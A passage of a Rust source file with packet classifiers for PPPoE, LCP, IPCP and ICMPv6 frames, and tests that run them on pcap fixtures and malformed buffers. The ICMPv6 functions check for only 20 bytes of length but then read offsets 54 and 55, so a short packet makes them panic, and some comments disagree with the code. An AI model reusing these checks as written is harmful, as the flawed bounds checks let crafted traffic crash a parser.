        return false;
    }

    // PPP LCP config request
    let code = u8::from_be_bytes([data[22]]);
    code == constants::LCP_CONF_ACK
}
pub fn is_lcp_conf_reject(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP LCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_LCP {
        return false;
    }

    // PPP LCP config reject
    let code = u8::from_be_bytes([data[22]]);
    code == constants::LCP_CONF_REJECT
}
pub fn is_lcp_conf_req(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP LCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_LCP {
        return false;
    }

    // PPP LCP config request
    let code = u8::from_be_bytes([data[22]]);
    code == constants::LCP_CONF_REQ
}
pub fn is_icmpv6_router_sol(data: &[u8]) -> bool {
    // Check if packet length is sufficient for IPv6
    if data.len() < 14 + 40 {
        return false;
    }

    // Check Ethernet type field
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_IPV6 {
        return false;
    }

    // Check code field for Router sol
    let ipv6_code = u8::from_be_bytes([data[54]]);
    let result = ipv6_code == constants::IPCPV6_RS;
    println!("[+] Correct router code?: {:?}", result);
    result
}
pub fn is_lcp_echo_request(data: &[u8]) -> bool {
    // Check if packet length is sufficient for LCP echo request
    // 6 + 6 + 2 + 4 = PPP for sure
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for LCP (0xc021)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOESESS {
        return false;
    }

    // Check PPPoE code field
    let pppoe_code = u8::from_be_bytes([data[22]]);
    pppoe_code == constants::PPPOE_CODE_LCP_ECHO_REQ
}
pub fn is_icmpv6_nd_ns(data: &[u8]) -> bool {
    // Check if packet length is sufficient
    if data.len() < 14 + 6 {
        return false;
    }
    // Check Ethernet type field (0x86dd)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != 0x86dd {
        return false;
    }

    let ip_header = data[20];
    if ip_header != 0x3a {
        return false;
    }
    let code = data[54];
    code == 135
}
pub fn is_icmpv6_echo_reply(data: &[u8]) -> bool {
    // Check if packet length is sufficient
    if data.len() < 14 + 6 {
        return false; // Minimum length check
    }

    // Check Ethernet type field (0x86dd)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != 0x86dd {
        return false; // Only IPv6 packets
    }

    // Check if the next header is ICMPv6
    let ip_header = data[20]; // Assuming IPv6 header starts at index 20
    if ip_header != 0x3a {
        return false; // 0x3a corresponds to ICMPv6
    }

    // Check ICMPv6 type and code for Echo Reply (type: 129, code: 0)
    let icmpv6_type = data[54]; // ICMPv6 type field
    let icmpv6_code = data[55]; // ICMPv6 code field
    icmpv6_type == 129 && icmpv6_code == 0 // Echo Reply type and code
}

#[cfg(test)]
mod tests {

    use super::*;
    use pcap::Capture;

    #[test]
    fn test_is_ipcp_conf_req_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_req.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_ipcp_conf_req(packet.data) {
                println!("Found an IPCP CONF REQ packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of IPCP CONF REQ packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_ipcp_conf_ack_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_ack.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_ipcp_conf_ack(packet.data) {
                println!("Found an IPCP CONF ACK packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of IPCP CONF ACK packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_conf_req_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/lcp_conf_req.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_conf_req(packet.data) {
                println!("Found an LCP CONF REQ packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of LCP CONF REQ packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_conf_ack_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/lcp_conf_ack.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_conf_ack(packet.data) {
                println!("Found an LCP CONF ACK packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of LCP CONF ACK packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }
    #[test]
    fn test_is_padi_packet_from_file() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                println!("Found a PADI packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that 2 PADI packet were found
        assert_eq!(count, 2);
    }

    #[test]
    fn test_is_padr_packet_from_file() {
        let mut cap =
            Capture::from_file("test_data/padr_packet.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_padr_packet(packet.data) {
                println!("Found a PADR packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_icmpv6_router_sol_from_file() {
        let mut cap = Capture::from_file("test_data/icmpv6_router_sol.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_icmpv6_router_sol(packet.data) {
                println!("Found an ICMPv6 Router Solicitation packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_echo_request_from_file() {
        let mut cap = Capture::from_file("test_data/lcp_echo_request.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_echo_request(packet.data) {
                println!("Found an LCP Echo Request packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_icmpv6_nd_ns() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_nd_ns.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_icmpv6_nd_ns(packet.data) {
                println!("Found an LCP Echo Request packet: {:?}", packet);
                count += 1;
            }
        }
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_lcp_conf_reject_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap =
            Capture::from_file("test_data/lcp_conf_reject.pcap").expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_lcp_conf_reject(packet.data) {
                println!("Found an LCP CONF REJECT packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of LCP CONF REJECT packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    #[test]
    fn test_is_icmpv6_echo_reply_from_file() {
        // Open the pcap file from the test_data folder
        let mut cap = Capture::from_file("test_data/icmpv6_echo_reply.pcap")
            .expect("Failed to open pcap file");
        let mut count = 0;
        while let Ok(packet) = cap.next_packet() {
            if is_icmpv6_echo_reply(packet.data) {
                println!("Found an ICMPv6 Echo Reply packet: {:?}", packet);
                count += 1;
            }
        }

        // Assert that the expected number of ICMPv6 Echo Reply packets were found
        assert_eq!(count, 1); // Adjust the expected count accordingly
    }

    // Helper function to create a minimal valid packet buffer
    fn create_base_packet(size: usize) -> Vec<u8> {
        vec![0; size]
    }

    #[test]
    fn test_padi_packet_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(14);
        assert!(!is_padi_packet(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(20);
        wrong_type[12] = 0x88;
        wrong_type[13] = 0x64; // Not PPPoE Discovery
        assert!(!is_padi_packet(&wrong_type));

        // Test wrong PPPoE code
        let mut wrong_code = create_base_packet(20);
        wrong_code[12] = 0x88;
        wrong_code[13] = 0x63; // Correct PPPoE Discovery
        wrong_code[15] = 0x0A; // Wrong code (not PADI)
        assert!(!is_padi_packet(&wrong_code));
    }

    #[test]
    fn test_padr_packet_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(14);
        assert!(!is_padr_packet(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(20);
        wrong_type[12] = 0x88;
        wrong_type[13] = 0x64; // Not PPPoE Discovery
        assert!(!is_padr_packet(&wrong_type));

        // Test wrong PPPoE code
        let mut wrong_code = create_base_packet(20);
        wrong_code[12] = 0x88;
        wrong_code[13] = 0x63; // Correct PPPoE Discovery
        wrong_code[15] = 0x09; // Wrong code (PADI instead of PADR)
        assert!(!is_padr_packet(&wrong_code));
    }

    #[test]
    fn test_ipcp_conf_req_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_ipcp_conf_req(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(25);
        wrong_type[20] = 0xc0;
        wrong_type[21] = 0x22; // Wrong protocol
        assert!(!is_ipcp_conf_req(&wrong_type));

        // Test wrong code
        let mut wrong_code = create_base_packet(25);
        wrong_code[20] = 0xc0;
        wrong_code[21] = 0x21; // Correct protocol
        wrong_code[22] = 0x02; // Wrong code
        assert!(!is_ipcp_conf_req(&wrong_code));
    }

    #[test]
    fn test_ipcp_conf_ack_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_ipcp_conf_ack(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(25);
        wrong_type[20] = 0xc0;
        wrong_type[21] = 0x22; // Wrong protocol
        assert!(!is_ipcp_conf_ack(&wrong_type));

        // Test wrong code
        let mut wrong_code = create_base_packet(25);
        wrong_code[20] = 0xc0;
        wrong_code[21] = 0x21; // Correct protocol
        wrong_code[22] = 0x01; // Wrong code
        assert!(!is_ipcp_conf_ack(&wrong_code));
    }

    #[test]
    fn test_lcp_conf_req_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_lcp_conf_req(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(25);
        wrong_type[20] = 0xc0;
        wrong_type[21] = 0x22; // Wrong protocol
        assert!(!is_lcp_conf_req(&wrong_type));

        // Test wrong code
        let mut wrong_code = create_base_packet(25);
        wrong_code[20] = 0xc0;
        wrong_code[21] = 0x21; // Correct protocol
        wrong_code[22] = 0x02; // Wrong code
        assert!(!is_lcp_conf_req(&wrong_code));
    }

    #[test]
    fn test_lcp_conf_ack_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_lcp_conf_ack(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(25);
        wrong_type[20] = 0xc0;
        wrong_type[21] = 0x22; // Wrong protocol
        assert!(!is_lcp_conf_ack(&wrong_type));

        // Test wrong code
        let mut wrong_code = create_base_packet(25);
        wrong_code[20] = 0xc0;
        wrong_code[21] = 0x21; // Correct protocol
        wrong_code[22] = 0x01; // Wrong code
        assert!(!is_lcp_conf_ack(&wrong_code));
    }

    #[test]
    fn test_lcp_conf_reject_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_lcp_conf_reject(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(25);
        wrong_type[20] = 0xc0;
        wrong_type[21] = 0x22; // Wrong protocol
        assert!(!is_lcp_conf_reject(&wrong_type));

        // Test wrong code
        let mut wrong_code = create_base_packet(25);
        wrong_code[20] = 0xc0;
        wrong_code[21] = 0x21; // Correct protocol
        wrong_code[22] = 0x01; // Wrong code
        assert!(!is_lcp_conf_reject(&wrong_code));
    }

    #[test]
    fn test_icmpv6_router_sol_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(53);
        assert!(!is_icmpv6_router_sol(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(55);
        wrong_type[12] = 0x86;
        wrong_type[13] = 0xdc; // Not IPv6
        assert!(!is_icmpv6_router_sol(&wrong_type));

        // Test wrong ICMPv6 code
        let mut wrong_code = create_base_packet(55);
        wrong_code[12] = 0x86;
        wrong_code[13] = 0xdd; // Correct IPv6
        wrong_code[54] = 0x87; // Wrong ICMPv6 code
        assert!(!is_icmpv6_router_sol(&wrong_code));
    }

    #[test]
    fn test_lcp_echo_request_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_lcp_echo_request(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(25);
        wrong_type[12] = 0x88;
        wrong_type[13] = 0x63; // Wrong type
        assert!(!is_lcp_echo_request(&wrong_type));

        // Test wrong code
        let mut wrong_code = create_base_packet(25);
        wrong_code[12] = 0x88;
        wrong_code[13] = 0x64; // Correct type
        wrong_code[22] = 0x0A; // Wrong code
        assert!(!is_lcp_echo_request(&wrong_code));
    }

    #[test]
    fn test_icmpv6_nd_ns_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_icmpv6_nd_ns(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(55);
        wrong_type[12] = 0x86;
        wrong_type[13] = 0xdc; // Not IPv6
        assert!(!is_icmpv6_nd_ns(&wrong_type));

        // Test wrong IP header
        let mut wrong_ip = create_base_packet(55);
        wrong_ip[12] = 0x86;
        wrong_ip[13] = 0xdd; // Correct IPv6
        wrong_ip[20] = 0x3b; // Wrong next header
        assert!(!is_icmpv6_nd_ns(&wrong_ip));

        // Test wrong ICMPv6 code
        let mut wrong_code = create_base_packet(55);
        wrong_code[12] = 0x86;
        wrong_code[13] = 0xdd; // Correct IPv6
        wrong_code[20] = 0x3a; // Correct next header
        wrong_code[54] = 136; // Wrong code (not 135)
        assert!(!is_icmpv6_nd_ns(&wrong_code));
    }

    #[test]
    fn test_icmpv6_echo_reply_adversarial() {
        // Test undersized packet
        let undersized = create_base_packet(19);
        assert!(!is_icmpv6_echo_reply(&undersized));

        // Test wrong ethertype
        let mut wrong_type = create_base_packet(56);
        wrong_type[12] = 0x86;
        wrong_type[13] = 0xdc; // Not IPv6
        assert!(!is_icmpv6_echo_reply(&wrong_type));

        // Test wrong IP header
        let mut wrong_ip = create_base_packet(56);
        wrong_ip[12] = 0x86;
        wrong_ip[13] = 0xdd; // Correct IPv6
        wrong_ip[20] = 0x3b; // Wrong next header
        assert!(!is_icmpv6_echo_reply(&wrong_ip));

        // Test wrong ICMPv6 type
        let mut wrong_type_code = create_base_packet(56);
        wrong_type_code[12] = 0x86;
        wrong_type_code[13] = 0xdd; // Correct IPv6
        wrong_type_code[20] = 0x3a; // Correct next header
        wrong_type_code[54] = 128; // Wrong type (not 129)
        wrong_type_code[55] = 0; // Correct code
        assert!(!is_icmpv6_echo_reply(&wrong_type_code));

        // Test wrong ICMPv6 code
        let mut wrong_code = create_base_packet(56);
        wrong_code[12] = 0x86;
        wrong_code[13] = 0xdd; // Correct IPv6
        wrong_code[20] = 0x3a; // Correct next header
        wrong_code[54] = 129; // Correct type
        wrong_code[55] = 1; // Wrong code (not 0)
        assert!(!is_icmpv6_echo_reply(&wrong_code));
    }
}
